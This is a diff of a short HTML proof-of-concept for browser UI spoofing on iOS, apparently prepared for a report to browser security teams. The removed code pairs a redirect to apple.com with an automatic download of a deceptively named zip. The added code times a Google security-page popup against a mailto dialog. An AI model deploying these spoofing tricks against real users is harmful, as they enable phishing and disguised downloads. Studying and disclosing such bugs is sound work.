@@ -1,34 +1,14 @@
-<!doctype html>
-<html>
-<head>
-<meta charset="utf-8">
-<title>Safari iOS Test</title>
-</head>
+<!-- Button Mailto -->
+<input type="button" value="Click Call Center (Mailto)"
+onclick="
+setTimeout(function() {
+  window.open('https://myaccount.google.com/security');
+}, 1600);
 
-<body>
-
-<button onclick="poc()">TEST</button>
-
-<script>
-function poc() {
-
-  // 1. Coba pindah ke apple.com dulu
-  setTimeout(() => {
-    window.location.href = "https://apple.com";
-  }, 0);
-
-  // 2. Coba trigger download setelahnya
-  setTimeout(() => {
-    const a = document.createElement("a");
-    a.href = 'https://ecdnts-del.github.io/test-apk/on "google.com" file.zip also chrome.zip';
-    a.download = 'on "google.com" file.zip also chrome.zip';
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-  }, 2500);
-
-}
-</script>
+setTimeout(function() {
+  document.location = 'mailto:fake.google@security?subject=POC%20-%20Chrome%20iOS%20UI%20Spoofing&body=Hello%20Chromium%20Security%20Team,%0D%0A%0D%0AThis%20is%20a%20POC%20for%20Chrome%20iOS%20UI%20spoofing.%20Clicking%20this%20button%20opens%20a%20mailto%20dialog%20while%20the%20page%20redirects%20to%20Apple.com.%0D%0A%0D%0ARegards,%0D%0AQadhafy%20Muhammad%20Tera';
+}, 700);
+">
 
 </body>
 </html>
